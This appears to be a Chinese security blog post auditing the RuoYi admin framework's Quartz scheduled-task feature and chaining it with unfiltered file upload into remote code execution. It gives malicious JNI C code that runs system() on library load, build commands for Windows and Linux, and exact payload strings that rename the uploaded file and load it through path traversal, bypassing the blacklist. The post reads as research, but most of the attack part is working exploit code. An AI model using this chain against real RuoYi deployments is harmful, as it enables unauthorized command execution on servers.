#  Java代审&后台计划任务中的RCE攻击   
 T3Ysec   2025-05-19 14:49  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvgp623Y0UwTalyKUIHiasQmIyIb2pqJtS4sa8A1FMvib6MxA0CWHSiaXbw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvGVaWpHQbibTFEUVPcIl65QsseWxTGVib13LruTgHBic5l48ynZHg0MkTw/640?wx_fmt=gif&from=appmsg "")  
  
**鼎新安全**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvGVaWpHQbibTFEUVPcIl65QsseWxTGVib13LruTgHBic5l48ynZHg0MkTw/640?wx_fmt=gif&from=appmsg "")  
  
  
更多资料  
  
持续关注  
  
  
  
计划任务  
  
  
  
先分析路由：  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvaXI4jIh9rtbP5FNAnGcdW9rVQ02Vy5ch4SkaMicCkkFicWxonaibV45UA/640?wx_fmt=png&from=appmsg "")  
  
对于java代码文件src/main/java/com/ruoyi/quartz/controller/SysJobController.java  
  
添加计划任务逻辑  
  
  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvbX2xSOnZY32n8kOMem8GHM34mjk788zTCQdNHswZJsPDUeBQ6B6TKQ/640?wx_fmt=png&from=appmsg "")  
  
首先先判断cron表达式是否正确  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvoKShDZTCYQTNSuUokQCHdt7Pq6mJFvc33aVUh2zxaG2T1gmPeWkOjQ/640?wx_fmt=png&from=appmsg "")  
  
又判断是否有rmi字段，目标字符串不允许'ldap(s)'调用和http  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvo4h0x6D1beiavF4XMIFO7HVelKb7Z7wKwgqz8jViaONicc4NzjA9HUXLA/640?wx_fmt=png&from=appmsg "")  
  
然后遍历黑名单进行判断是否输入 违规类  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvwGRhsy0IgV1IJjALJhy0GjMZBRib6zAXjAqhibwC1OZ0cYw6uZ1jGNSQ/640?wx_fmt=png&from=appmsg "")  
  
通过for遍历在通过把主字符串 str 从第 i 个字符开始，截取 len 长度，和 searchStr 的前 len 个字符做 逐个字符比较，支持忽略大小写去匹配是否存在关键字![image.png](https://mmbiz.qpic.cn/mmbiz_gif/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvr2NrePicdWiakicHnCCQtRWicpG7fsNibmC01gibI6CXy7RE8mt6ybVKiaFuQ/640?wx_fmt=gif&from=appmsg "")  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvpjPwsBEO62DgrOlRQxknia0GS6kQ3g7ZDt1StHIbgTUniakoicvt4Hj7A/640?wx_fmt=png&from=appmsg "")  
  
  
最后一个逻辑匹配是否在白名单内  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvibTxiaFBT7PPdzK9teMN3oWLImGGprFiaZIKGfxfo78NjJLjBZ8Myyw7A/640?wx_fmt=png&from=appmsg "")  
  
黑名单的类：  
```
public static final String[] JOB_ERROR_STR = {
"java.net.URL",
"javax.naming.InitialContext",
"org.yaml.snakeyaml",
"org.springframework",
"org.apache",
"com.ruoyi.common.utils.file",
"com.ruoyi.common.config",
"com.ruoyi.generator"
};
```  
  
白名单的类：  
```
public static final String[] JOB_WHITELIST_STR = { "com.ruoyi.quartz.task" };
```  
  
执行任务逻辑  
  
  
  
有个前置知识：  
  
spring Quartz 的执行是通过Scheduler 类去执行的，该类下的方法  
  
<table><thead><tr><th><section><span leaf="">方法</span></section></th><th><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td><span style="font-size: 15px;letter-spacing: normal;line-height: 1.6em;"><span style="font-size: 15px;"></span><span leaf="">scheduleJob(JobDetail jobDetail, Trigger trigger)</span></span></td><td><section><span leaf="">添加并调度一个任务</span></section></td></tr><tr><td><span style="font-size: 17px;letter-spacing: normal;line-height: 1.59em;"><span leaf="">addJob(</span></span><span style="letter-spacing: normal;line-height: 1.6em;font-size: 15px;"><span leaf="">JobDetail</span></span><span style="font-size:15px;"><span leaf=""> jobDetail, boolean replace)</span></span></td><td><section><span leaf="">添加任务但不触发</span></section></td></tr><tr><td><span style="font-size: 17px;letter-spacing: normal;line-height: 1.59em;"><span leaf="">deleteJob(JobKey jobKey)</span></span></td><td><section><span leaf="">删除任务</span></section></td></tr><tr><td><section><span leaf="">getJobDetail(JobKey jobKey)</span></section></td><td><section><span leaf="">获取任务详情</span></section></td></tr><tr><td><section><span leaf="">checkExists(JobKey jobKey)</span></section></td><td><section><span leaf="">判断任务是否存在</span></section></td></tr><tr><td><section><span leaf="">triggerJob(JobKey jobKey)</span></section></td><td><section><span leaf="">立即执行任务</span></section></td></tr><tr><td><section><span leaf="">triggerJob(JobKey jobKey, JobDataMap dataMap)</span></section></td><td><section><span leaf="">立即执行任务并传参</span></section></td></tr></tbody></table>  
[前端请求] → [JobController 添加任务]              
  
        ↓       
  
   [Quartz Scheduler]              
  
        ↓      
  
   [MyQuartzJob.executeInternal()] 输出执行逻辑  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvMU4T8rKQDRARnjeTqlt6s4vCndev9xsMciceGKQUVS8ZYOO0bH6w5vw/640?wx_fmt=png&from=appmsg "")  
  
调用jobService的run方法  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyveKb3bJYKJ2GYJ5dh4FdXesF9ZeWXjjB0xUWkj4Jz6iaevouicr6pKkibQ/640?wx_fmt=png&from=appmsg "")  
  
通过从数据库查询定时任务，在调用了scheduler.triggerJob(jobKey, dataMap) 立即执行任务并传参，最后的最后走到AbstractQuartzJob#doExecute(context, sysJob);  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvL4ib7zeVMGVJh3780KjFJIMNqjpRtoibN7A6hP8cj2l6LPUOblV7Zmmg/640?wx_fmt=png&from=appmsg "")  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyv1GA7Muxic4IiaXUMUkZCM7mYLx86Ofib4ugjzW2lonYXR8Ay7qvECWReA/640?wx_fmt=png&from=appmsg "")  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyv0e75sRzEsWE1vZYaChcWUJ5q8cwUSxcQyBKvcGicWpcO7SZRbrdHrxw/640?wx_fmt=png&from=appmsg "")  
  
这个逻辑我相信大家不陌生，就是简单的类的加载实例化方法  
  
分析：传入ryTask.ryParams('ry')  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvt4SdLTibzM0HYyfNGBKnDhvO2onO5VWL3uJEPg4xMZnhWrH3RhULdWg/640?wx_fmt=png&from=appmsg "")  
  
在通过判断beanName是有包名，如果有那就调用包名的逻辑就是获取加载器去加载  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvQiaqAGomZ2gLFmmkhFcC1ohk34QSXZyv3qfos4axr6ZvnDRVCwZG2AQ/640?wx_fmt=png&from=appmsg "")  
  
最后的我就不说了执行了方法传入了参数。  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvDeda45PpWnt9oJv8BPr2O3BUhI9T7ibNYbniaYSQPJ9h3uZU1RkTZWvw/640?wx_fmt=png&from=appmsg "")  
  
总结  
  
• 使用的类不在黑名单中  
  
• 包含com.ruoyi.quartz.task字符串  
  
• 不可以使用rmi ldap http字符串  
  
文件上传  
  
  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvJVzIJRzC8hicu3v64cibGjweBnwEufTzRxfQic1mHHCLYBUIyibM1r7xbw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_gif/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvr2NrePicdWiakicHnCCQtRWicpG7fsNibmC01gibI6CXy7RE8mt6ybVKiaFuQ/640?wx_fmt=gif&from=appmsg "")  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvvelJTleib3NbNFYchQDt1EiaLicT6C1oiaoBaz85Qqy1ra2Jq70XREZexg/640?wx_fmt=png&from=appmsg "")  
  
没有任何过滤的  
  
结合导致RCE  
  
  
  
有一种技术是JNI，java底层还是由c语言实现，而JAVA也允许用户去调用C代码，图如下  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvwNeBjcaZGX8NVb7jUKMiaGr0sRRPS0zyjda9tqyBy7LK3Y4iaibB7umtw/640?wx_fmt=png&from=appmsg "")  
  
其实利用思路很简单就是利用 c 语言生成 dll 文件，然后利用 System.loadLibrar 来加载执行就行了。  
  
本地实现 JNI  
  
  
  
先编写写一个命令执行的 java 类  
```
package com.ruoyi.system;
public class cmd {
   public native void exec();
}
```  
  
使用Javac编译为C头文件：  
```
& "C:\Program Files\Java\jdk1.8.0_112\bin\javac.exe" -h . -cp . cmd.java
```  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvML8oBrnPSrjbYXwicCDY7MzSLicfYYVDGuT3OiaCmibrXASguCUG2yrAHA/640?wx_fmt=png&from=appmsg "")  
  
在去编写我的恶意C代码：  
```
#include "com_ruoyi_system_cmd.h"
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

JNIEXPORT void JNICALL Java_com_ruoyi_system_cmd_exec(JNIEnv *, jobject)
{
   system("calc");
}
```  
  
然后执行下面命令编写为 dll 文件  
  
Win:  
  
  
```
gcc -I "C:\Program Files\Java\jdk1.8.0_112\include" -I "C:\Program Files\Java\jdk1.8.0_112\include\win32" -shared -o cmd.dll .\cmd.c
```  
  
Linux:  
  
  
  
```
gcc -fPIC -I"/root/jdk8/include" -I "/root/jdk8/include/linux" -shared -o rce.so cmd.c
```  
  
编译出来dll后我们通过本地的加载测试是否能正常执行  
```
package com.ruoyi.system;

public class Text {
   public static void main(String[] args) {
       System.out.println("Library path: " + System.getProperty("java.library.path"));
       System.loadLibrary("cmd");
   }
}
```  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvAPOSnWSiaRRV1gQNG57ibpAfictgmRicsvVQ7MoF0JyVQrRuKEx1axeX0Q/640?wx_fmt=png&from=appmsg "")  
  
本地的演示。  
  
问题  
  
  
  
怎么让他在加载的时候就调用执行命令呢？  
  
使用JNI_OnLoad解决：  
```
#include <jni.h>
#include <stdio.h>

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
   printf("JNI_OnLoad called! 执行初始化操作\n");

   // 这里写你想执行的命令，比如启动外部程序、初始化资源等
   system("dir"); // Windows示例，Linux可换成"ls"

   return JNI_VERSION_1_6;  // 返回JNI版本，必须返回合适的版本
}
```  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyv03QD7lVVxibYet6Ra5HZZsUbCdoNibs3pn3yC8c8CfMr0AR71BokmR2w/640?wx_fmt=png&from=appmsg "")  
  
现在开始R Ruoyi吧  
  
上传恶意JNI文件  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvVRC6Ny8TlRPaIZdicfDU9Miba0ooXxr8sf7YV8fmbicicGMusZWjNtRgwA/640?wx_fmt=png&from=appmsg "")  
  
通过使用RenameUtil类方法去对文件名进行修改  
```
ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying
("D:\ruoyi\uploadPath\upload\2025\05\19\com.ruoyi.quartz.task_20250519013441A002.txt",
"D:\ruoyi\uploadPath\upload\2025\05\19\com.ruoyi.quartz.task_20250519013441A002.dll");
```  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyv0g8HjCxuicMhnhLXERXicDQ6k7hh0YSltX0niaI17lHSofNWWcibL5fT3A/640?wx_fmt=png&from=appmsg "")  
```
com.sun.glass.utils.NativeLibLoader.loadLibrary('../../../com.ruoyi.quartz.task_20250519013441A002')
```  
  
执行加载JNI  
  
![图片.png](https://mmbiz.qpic.cn/mmbiz_png/CJ6TqbDbFpyIHcTPBOYuTOPJCibAxQZyvCyHz5wWXbadicA4nD5rpb6yA4SleEU9Dicrsm6ecNrvQudibkBeLkdLxA/640?wx_fmt=png&from=appmsg "")  
  
限制  
  
  
  
1、知道对方上传文件的路径和当前网站的路径  
  
2、对方JDK版本不能过高不然会不存在          com.sun.glass.utils.NativeLibLoader类（但是也可以寻找新的Loader类）com.sun.glass.utils.NativeLibLoader存在于JDK 8  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiaOUiaO5LKp3IFbIDtGYglHc8nfZnO0Bq1aflyd9HhHYMHOLrFmKPqOkNQkyy3has0joYG8UlWBUaQ/640 "")  
  
END  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHiaOUiaO5LKp3IFbIDtGYglHc8nfZnO0Bq1aflyd9HhHYMHOLrFmKPqOkNQkyy3has0joYG8UlWBUaQ/640 "")  
  
  
注：鼎新安全有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。  
  
